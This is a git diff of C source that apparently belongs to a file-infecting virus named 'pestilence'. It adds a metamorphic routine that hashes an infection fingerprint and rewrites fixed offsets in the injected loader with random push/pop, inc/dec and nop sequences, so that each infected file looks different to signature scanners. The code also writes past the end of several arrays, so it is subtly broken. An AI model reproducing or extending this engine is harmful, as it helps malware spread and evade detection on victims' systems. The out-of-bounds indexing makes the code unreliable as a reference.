@@ -1,14 +1,26 @@
 #include "pestilence.h"
 
-void metamorph(t_info *info, t_fingerprint *fingerprint)
+static unsigned char	hash_fingerprint(int fingerprint, int nb)
 {
-	uint32_t tab_push[15];
-	uint32_t tab_pop[15];
-	uint32_t tab_inc[15];
-	uint32_t tab_dec[15];
+	int hash = 5381;
+	while (nb > 0)
+	{
+		hash = hash * 33 + (fingerprint & 0xFF);
+		hash = hash * 33 + ((fingerprint & 0xFF00) >> 8);
+		hash = hash * 33 + ((fingerprint & 0xFF0000) >> 16);
+		hash = hash * 33 + (fingerprint >> 24);
+		nb--;
+	}
+	return ((char)hash);
+}
 
-	size_t tab_offset_loader[4];
-	size_t tab_offset_bis[12];
+void			metamorph(t_info *info, t_fingerprint *fingerprint)
+{
+	uint32_t	tab_push[15];
+	uint32_t	tab_pop[15];
+	uint32_t	tab_inc[15];
+	uint32_t	tab_dec[15];
+	size_t		tab_offset[17];
 
 	tab_push[0] = 0x50; //rax
 	tab_push[1] = 0x51; //rcx
@@ -78,31 +90,54 @@ void metamorph(t_info *info, t_fingerprint *fingerprint)
 	tab_dec[14] = 0x49ffce; //r14
 	tab_dec[15] = 0x49ffcf; //r15
 
-	tab_offset_loader[0] = (size_t)(info->text_begin + info->text_size + 0x1c);
-	tab_offset_loader[1] = (size_t)(info->text_begin + info->text_size + 0x2c);
-	tab_offset_loader[2] = (size_t)(info->text_begin + info->text_size + 0x47);
-	tab_offset_loader[3] = (size_t)(info->text_begin + info->text_size + 0x8f);
-	tab_offset_loader[4] = (size_t)(info->text_begin + info->text_size + 0xd1);
+	tab_offset[0] = (size_t)(info->text_begin + info->text_size + 0x1c);
+	tab_offset[1] = (size_t)(info->text_begin + info->text_size + 0x2c);
+	tab_offset[2] = (size_t)(info->text_begin + info->text_size + 0x47);
+	tab_offset[3] = (size_t)(info->text_begin + info->text_size + 0x8f);
+	tab_offset[4] = (size_t)(info->text_begin + info->text_size + 0xd1);
 
-	tab_offset_bis[0] = (size_t)(info->file + info->offset_bis + BIS_SIZE + 0x23);
-	tab_offset_bis[1] = (size_t)(info->file + info->offset_bis + BIS_SIZE + 0x50);
-	tab_offset_bis[2] = (size_t)(info->file + info->offset_bis + BIS_SIZE + 0x6d);
-	tab_offset_bis[3] = (size_t)(info->file + info->offset_bis + BIS_SIZE + 0xce);
-	tab_offset_bis[4] = (size_t)(info->file + info->offset_bis + BIS_SIZE + 0x132);
-	tab_offset_bis[5] = (size_t)(info->file + info->offset_bis + BIS_SIZE + 0x1ca);
-	tab_offset_bis[6] = (size_t)(info->file + info->offset_bis + BIS_SIZE + 0x24a);
-	tab_offset_bis[7] = (size_t)(info->file + info->offset_bis + BIS_SIZE + 0x25a);
-	tab_offset_bis[8] = (size_t)(info->file + info->offset_bis + BIS_SIZE + 0x2ba);
-	tab_offset_bis[9] = (size_t)(info->file + info->offset_bis + BIS_SIZE + 0x2e8);
-	tab_offset_bis[10] = (size_t)(info->file + info->offset_bis + BIS_SIZE + 0x377);
-	tab_offset_bis[11] = (size_t)(info->file + info->offset_bis + BIS_SIZE + 0x3e8);
-	tab_offset_bis[12] = (size_t)(info->file + info->offset_bis + BIS_SIZE + 0x488);
+	tab_offset[5] = (size_t)(info->file + info->offset_bis + BIS_SIZE + 0x23);
+	tab_offset[6] = (size_t)(info->file + info->offset_bis + BIS_SIZE + 0x50);
+	tab_offset[7] = (size_t)(info->file + info->offset_bis + BIS_SIZE + 0x6d);
+	tab_offset[8] = (size_t)(info->file + info->offset_bis + BIS_SIZE + 0xce);
+	tab_offset[9] = (size_t)(info->file + info->offset_bis + BIS_SIZE + 0x132);
+	tab_offset[10] = (size_t)(info->file + info->offset_bis + BIS_SIZE + 0x1ca);
+	tab_offset[11] = (size_t)(info->file + info->offset_bis + BIS_SIZE + 0x24a);
+	tab_offset[12] = (size_t)(info->file + info->offset_bis + BIS_SIZE + 0x25a);
+	tab_offset[13] = (size_t)(info->file + info->offset_bis + BIS_SIZE + 0x2ba);
+	tab_offset[14] = (size_t)(info->file + info->offset_bis + BIS_SIZE + 0x2e8);
+	tab_offset[15] = (size_t)(info->file + info->offset_bis + BIS_SIZE + 0x377);
+	tab_offset[16] = (size_t)(info->file + info->offset_bis + BIS_SIZE + 0x3e8);
+	tab_offset[17] = (size_t)(info->file + info->offset_bis + BIS_SIZE + 0x488);
 
-	(void)tab_push;
-	(void)tab_pop;
-	(void)tab_inc;
-	(void)tab_dec;
-	(void)tab_offset_loader;
-	(void)tab_offset_bis;
-	(void)fingerprint;
+	int		i = 0;
+	unsigned char	ret = 0;
+	unsigned char	i_regs = 0;
+	unsigned char	i_tab = 0;
+	unsigned long	nop = 0x909090909090;
+
+	while (i < 18)
+	{
+
+		ret = hash_fingerprint(fingerprint->fingerprint, i);
+		i_regs = (ret * 15) / 255;
+		i_tab = (ret * 2) / 255;
+		ft_memcpy((void*)tab_offset[i], &nop, 0x6);
+		if (i_tab == 1)
+		{
+			int		len = 0;
+			if (i_regs < 8)
+				len = 0x2;
+			else
+				len = 0x4;
+			ft_memcpy((void*)tab_offset[i], &tab_push[i_regs], len);
+			ft_memcpy((void*)tab_offset[i] + 0x4, &tab_pop[i_regs], len);
+		} else if (i_tab == 2)
+		{
+			ft_memcpy((void*)tab_offset[i], &tab_inc[i_regs], 0x3);
+			ft_memcpy((void*)tab_offset[i] + 0x4, &tab_dec[i_regs], 0x3);
+		}
+		i++;
+	}
+	return ;
 }
